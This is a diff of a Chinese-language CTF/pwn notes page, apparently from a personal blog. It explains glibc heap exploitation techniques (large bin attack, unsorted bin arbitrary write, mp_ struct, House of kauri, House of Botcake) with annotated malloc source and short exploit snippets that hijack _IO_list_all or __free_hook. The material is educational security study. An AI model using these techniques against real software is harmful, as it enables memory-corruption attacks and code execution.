+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">  <span class="c1">// _int_malloc 中遍历 unsorted bin，若不符合申请大小的堆块按范围放入large/small bin中
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="n">in_smallbin_range</span><span class="p">(</span><span class="n">size</span><span class="p">)){...}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">victim_index</span> <span class="o">=</span> <span class="n">largebin_index</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">bck</span> <span class="o">=</span> <span class="n">bin_at</span><span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim_index</span><span class="p">);</span> <span class="c1">// large bin
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">fwd</span> <span class="o">=</span> <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>					<span class="c1">// large bin 最大 chunk
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	
+</span></span><span class="line"><span class="cl">    <span class="c1">// 更新bk_nextsize和fd_nextsize
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="n">fwd</span> <span class="o">!=</span> <span class="n">bck</span><span class="p">){</span> <span class="c1">// large bin 非空
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">size</span> <span class="o">|=</span> <span class="n">PREV_INUSE</span><span class="p">;</span> <span class="p">...</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="n">size</span><span class="p">)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">bk</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">)){...}</span> 
+</span></span><span class="line"><span class="cl">      <span class="k">else</span><span class="p">{</span><span class="c1">// size 大于等于 large bin 最小 chunk 大小
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">...</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">size</span> <span class="o">&lt;</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">){</span> <span class="c1">// 遍历找到第一个小于等于victim size的chunk
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="n">fwd</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="p">;</span> <span class="p">...</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">size</span> <span class="o">==</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">fwd</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">){...}</span> <span class="c1">// 不更新fd_nextsize和bk_nextsize
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="p">;</span>				<span class="c1">//【1】
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span>	<span class="c1">//【2】
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>				<span class="c1">//【3】
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span><span class="c1">//【4】
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">bck</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span><span class="c1">//【5】
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{...}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">...</span>
+</span></span><span class="line"><span class="cl">  <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span><span class="c1">//【6】
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">fwd</span><span class="p">;</span><span class="c1">//【7】
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span><span class="c1">//【8】
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span><span class="c1">//【9】
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>利用</strong></p>
+<ol>
+<li>劫持 large bin 中一个<strong>在同等大小 chunk 中 bk 方向最靠前的 chunk</strong> 的 <strong>bk</strong> 和 <strong>bk_nextsize</strong></li>
+<li>然后释放一个比该 chunk <strong>稍大一些</strong>的 chunk</li>
+</ol>
+<p><img src="/img/pwn_note.zh-cn.assets/image-20241126133526023.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241126133526023"
+	
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">malloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">malloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">)</span> <span class="c1"># 用于分隔</span>
+</span></span><span class="line"><span class="cl"><span class="n">malloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x410</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">malloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">)</span> <span class="c1"># 用于分隔</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># chunk0进入unsorted bin</span>
+</span></span><span class="line"><span class="cl"><span class="n">malloc</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">)</span> <span class="c1"># 由于0x400无法满足0x500，chunk0进入large bin</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;stderr&#34;</span><span class="p">]</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_list_all&#39;</span><span class="p">]</span><span class="o">-</span><span class="mh">0x20</span><span class="p">))</span> <span class="c1"># UAF伪造</span>
+</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># chunk2进入unsorted bin</span>
+</span></span><span class="line"><span class="cl"><span class="n">malloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">)</span> <span class="c1"># chunk2进入large bin 触发两处任意地址写，将stderr和_IO_list_all改为堆地址</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>原理</strong></p>
+<ul>
+<li>
+<p>glibc-2.30后，在遍历 unsorted bin将堆块放入large bin代码中【申请size大于等于最小large bin size】中加入检查</p>
+</li>
+<li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">!=</span> <span class="n">fwd</span><span class="p">))</span> 
+</span></span><span class="line"><span class="cl">    <span class="c1">// 旧版本控制该fd_nextsize为target，此处将不能利用
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">&#34;malloc(): largebin double linked list corrupted (nextsize)&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">fwd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">&#34;malloc(): largebin double linked list corrupted (bk)&#34;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+<p><strong>利用</strong></p>
+<p>利用【申请size小于最小large bin size】如下这段代码，伪造<code>bk_nextsize</code>来达成一处任意地址写大数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">fwd</span> <span class="o">!=</span> <span class="n">bck</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="n">size</span> <span class="o">|=</span> <span class="n">PREV_INUSE</span><span class="p">;</span> <span class="p">...</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="n">size</span><span class="p">)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">bk</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fwd</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>		<span class="c1">// 【1】
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">bck</span> <span class="o">=</span> <span class="n">bck</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>	<span class="c1">// 【2】
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">        <span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span> <span class="c1">// 【3】
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span> <span class="c1">// 【4】
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span> <span class="c1">// 【5】
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>申请0x500的大堆可使得target指向0x420 victim</p>
+<p><img src="/img/pwn_note.zh-cn.assets/image-20241127125247206.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241127125247206"
+	
+	
+></p>
+<p>申请0x200的小堆可使得target指向0x430 的堆，走的过程：</p>
+<ul>
+<li>unsorted bin中直接切割chunk条件中的<code>victim==av-&gt;last_remainder</code>不满足，进入large bin触发attack</li>
+<li>接着程序在large bin中按size升序找合适的chunk切割出所需内存，通过bk_nextsize访问最小的chunk即访问到0x430的堆</li>
+</ul>
+<p><img src="/img/pwn_note.zh-cn.assets/image-20241127132408572.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241127132408572"
+	
+	
+></p>
+<h4 id="mp_-struct-attack">mp_ struct attack</h4>
 <ul>
 <li>修改掉 <code>tcache_bins</code>：# 只允许的最大tcache chunk大小，释放的小于<code>mp_.tcache_bins</code>的<code>chunk</code>会被当作<code>tcache bin</code>处理，可以把很大的 <code>chunk</code> 用 <code>tcachebin</code> 管理</li>
 <li>修改掉 <code>tcache_count</code>： 可以控制链表的 <code>chunk</code> 的数量</li>
@@ -9428,6 +10187,7 @@
 <li>覆写<code>free_hook</code>为<code>system</code>，进而getshell</li>
 </ul>
 <h3 id="unsorted-bin-attack">Unsorted bin attack</h3>
+<h4 id="地址泄露-2">地址泄露</h4>
 <p><strong>libc地址泄露</strong></p>
 <p>结合off-by-null或UAF</p>
 <div class="highlight"><div class="chroma">
@@ -9470,16 +10230,7 @@
 <p>glibc-2.23中指向main_arena偏移88的地址</p>
 </li>
 </ul>
-<p><img src="/img/pwn_note.zh-cn.assets/-172844676894980.assets"
-	
-	
-	
-	loading="lazy"
-	
-		alt="img"
-	
-	
-></p>
+<img src="/img/pwn_note.zh-cn.assets/-172844676894980.assets" alt="img"  />
 <p><strong>通过main_arena获取libc基址：main_arena存储在libc.so.6文件的.data段，IDA打开libc文件，搜索<code>malloc_trim()</code>，如图得到偏移地址</strong></p>
 <img src="/img/pwn_note.zh-cn.assets/-172844676894981.assets" alt="img" style="zoom:80%;" />
 <p>获取libc基址后获取<code>malloc_hook</code>和<code>realloc</code>地址</p>
@@ -9527,8 +10278,32 @@
 </span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># 将打印出的值最后3位改为0即为堆地址</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><strong>任意地址写大数</strong></p>
-<p><code>Unsorted bin</code>遍历堆块使用<code>bk</code>指针</p>
+</div><h4 id="任意地址写大数">任意地址写大数</h4>
+<ul>
+<li>通过该技巧可以用于绕过判断检查等，如向<code>global_max_fast</code>写入一个大值，扩大fastbin范围</li>
+<li>控制bk值将<code>unsorted_chunks(av)</code>写到任意地址，glibc-2.28之前版本可利用</li>
+</ul>
+<p><strong>绕过</strong></p>
+<ul>
+<li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">chunksize_nomask</span> <span class="p">(</span><span class="n">victim</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">SIZE_SZ</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="o">||</span> <span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">chunksize_nomask</span> <span class="p">(</span><span class="n">victim</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">av</span><span class="o">-&gt;</span><span class="n">system_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>fake chunk被链入unsorted bin中，将其申请出来需要保证size合法</p>
+</li>
+<li>
+<p>且 unsorted bin  chunk 的 bk 字段指向地址必须可写</p>
+</li>
+</ul>
+<p><strong>原理</strong></p>
+<p><code>Unsorted bin</code>遍历堆块使用<code>bk</code>指针，malloc取出victim代码使得其fd内填入本unsorted bin的地址</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -9541,76 +10316,108 @@
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="c1">// 简化源码 libc-2.27
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="c1">// glibc-2.23 _int_malloc
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">victim</span> <span class="o">=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span> <span class="c1">// 链表尾部堆块：victim
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">bck</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>                  <span class="c1">// 倒数第二堆块：bck
-</span></span></span><span class="line"><span class="cl"><span class="c1">// 对victim的size位检查，获取chunk大小
-</span></span></span><span class="line"><span class="cl"><span class="c1">// ... ...不属于small bin范围，则将victim脱链放入合适链中或返回用户
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>
-</span></span><span class="line"><span class="cl"><span class="n">unsorted_chunks</span><span class="p">(</span><span class="n">av</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">unsorted_chunks</span><span class="p">(</span><span class="n">av</span><span class="p">);</span> <span class="c1">// 此处向bck-&gt;fd即((target-0x10)+0x10)处写入main_aren偏移地址，包括7f可达成写入7f构造目的
+</span></span><span class="line"><span class="cl"><span class="c1">// 将victim 从 unsorted bin脱链取出，漏洞点在于未检查bck-&gt;fd是否等于victim，glibc-2.28修复加入检查
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">unsorted_chunks</span><span class="p">(</span><span class="n">av</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">unsorted_chunks</span><span class="p">(</span><span class="n">av</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="c1">// 此处向bck-&gt;fd即((target-0x10)+0x10)处写入main_aren偏移的unsorted bin地址，包括7f可达成写入7f构造目的
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><ul>
-<li>通过堆溢出或其他修改<code>unsorted bin</code>中堆块的<code>bk(addr+0x8)</code>为<code>target_addr - 0x10</code>，<code>malloc</code>触发漏洞达成写大数（地址数），即向<code>target_addr</code>写入<code>unsorted_chunks(av)</code>值——<code>mainarena</code>偏移地址</li>
-</ul>
-<p><img src="/img/pwn_note.zh-cn.assets/-172844676894982.assets"
-	
-	
-	
-	loading="lazy"
-	
-		alt="img"
-	
-	
-></p>
-<h3 id="off-by-one">Off-by-one</h3>
-<p>更改后一块的<code>size</code>位，用于合并堆块造成堆块重叠</p>
-<h3 id="off-by-null">Off-by-null</h3>
-<p>原理：程序向堆缓冲区中写入时，字节数超过了该缓冲区本身所申请的字节数，且刚好越界了一个字节；利用该漏洞可以实现利用方法：<strong>poison null byte/off-by-null（适用于libc-2.27）</strong></p>
-<p><strong>触发漏洞：</strong></p>
-<p><img src="/img/pwn_note.zh-cn.assets/-172844676894985.assets"
-	
-	
-	
-	loading="lazy"
-	
-		alt="img"
-	
-	
-></p>
-<p><strong>原理</strong>：free(b)后并没有将b指针置为NULL，且此时b中的prev_size作为a的内容，可以填入a的数据，若能控制a的数据，超过b的prev_size区域后并且覆盖b的size区域中一个字节，则造成off-by-one</p>
+</div><p><strong>利用</strong></p>
 <ul>
-<li>要绕过高版本的glibc需要在b上构造数据进行绕过验证，旧版本check为<code>size==prev_size(next_chunk)</code>，新版本check为**<code>chunksize(P) != prev_size (next_chunk(P))</code>**</li>
-<li>在off by one后，<code>b</code>的<code>size</code>将会由于覆盖而改变，<code>chunksize(P)</code>即<code>b</code>的<code>size</code>大小，被覆盖为了<code>0xa00</code>，而<code>next_chunk(P)</code>本来应该为<code>c</code>的<code>prev_size</code>，但是此时并不是<code>c</code>，对于<code>b</code>的<code>next_chunk</code>的计算应该是<code>b</code>的<code>chunk</code>指针加上<code>b</code>的<code>size</code>，即图中【b-0x10+0xa00】，仍在<code>b</code>的<code>chunk</code>内，所以提前构造<code>* (size_t)(b+0x9f0) = 0xa00;</code></li>
+<li>
+<p>通过堆溢出或其他漏洞修改<code>unsorted bin</code>中堆块的<code>bk(addr+0x8)</code>为<code>target_addr - 0x10</code></p>
+</li>
+<li>
+<p><code>malloc</code>触发漏洞达成写大数（地址数），即向<code>target_addr</code>写入<code>unsorted_chunks(av)</code>值——<code>mainarena</code>偏移地址</p>
+</li>
 </ul>
-<p><img src="/img/pwn_note.zh-cn.assets/-172844676894986.assets"
+<p><img src="/img/pwn_note.zh-cn.assets/image-20241125180540007.png"
 	
 	
 	
 	loading="lazy"
 	
-		alt="img"
+		alt="image-20241125180540007"
 	
 	
 ></p>
-<p>free <code>b</code>后，进入<code>unsorted bin</code>中，申请新的<code>B1</code>和<code>B2</code>，将会从原来<code>b</code>的位置延续，而修改<code>c</code>的<code>pre_size</code>时也会因为伪造导致修改在了向上偏0x10的位置处，所以<code>c</code>仍然认为<code>prev_size</code>为<strong>0xa10</strong>，free B1和c后，会导致B1、B2和c一同合并为一个大chunk进入<code>unsorted bin</code>中，而B2并没有被free，再次申请d，会出现覆盖B2的情况（形成堆的堆叠），此时可以任意修改B2中的内容，通常B2（受害者）将是一个结构，其中包含我们要控制的有价值的指针</p>
-<p><strong>漏洞点：</strong></p>
+<h3 id="house-of">House of</h3>
+<h4 id="house-of-kauri">House of kauri</h4>
+<p>修改 <code>size</code> 使两次 <code>free</code> 的同一块内存进入不同 <code>entries</code> 来绕过tcache key的double free检查</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="p">;</span><span class="o">++</span><span class="n">i</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">i</span> <span class="o">&gt;</span> <span class="n">length</span><span class="p">)</span> <span class="k">break</span> <span class="c1">//i=length时多写一个
-</span></span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">new</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">)</span> <span class="c1"># chunk 10 用于防止tcache count为0</span>
+</span></span><span class="line"><span class="cl"><span class="n">new</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">new</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> <span class="c1"># chunk 10 进入 tcache bin</span>
+</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># chunk 1 进入 tcache bin 0x30</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">))</span> <span class="c1"># 修改 chunk 1 的 size 为 0x20</span>
+</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># chunk 1 进入 tcache bin 0x20</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">new</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook_addr</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">new</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">new</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">)</span> <span class="c1"># 申请出__free_hook堆块</span>
+</span></span></code></pre></td></tr></table>
 </div>
-</div><p>利用实现unsorted bin泄露方法：</p>
-<p>构造0,1,2,3共四个堆块，修改0号堆块内容溢出一字节到1堆块更改大小覆盖1和2堆块，此时1和2堆块被系统误认为为一个堆块，释放1堆块，将会有一个合并chunk进入unsorted bin（进入的<strong>前提</strong>为<strong>1和2堆块相加的大小要大于0x80</strong>），再申请一个堆块（和1堆块大小相等），此时unsorted bin分割导致只存有2堆块，2堆块的fd和bk都指向一个地址，访问2堆块可以泄露相关main_arena的地址</p>
-<h3 id="house-of">House of</h3>
-<h4 id="house-of-strom">House of strom</h4>
-<p>glibc-2.27及之前版本</p>
+</div><h4 id="house-of-botcake">House of Botcake</h4>
+<ul>
+<li>将同一个chunk释放到tcache和unsorted bin中，释放在unsorted bin的chunk借助堆块合并改变大小</li>
+<li>会形成堆块堆叠，一次double free可多次使用</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
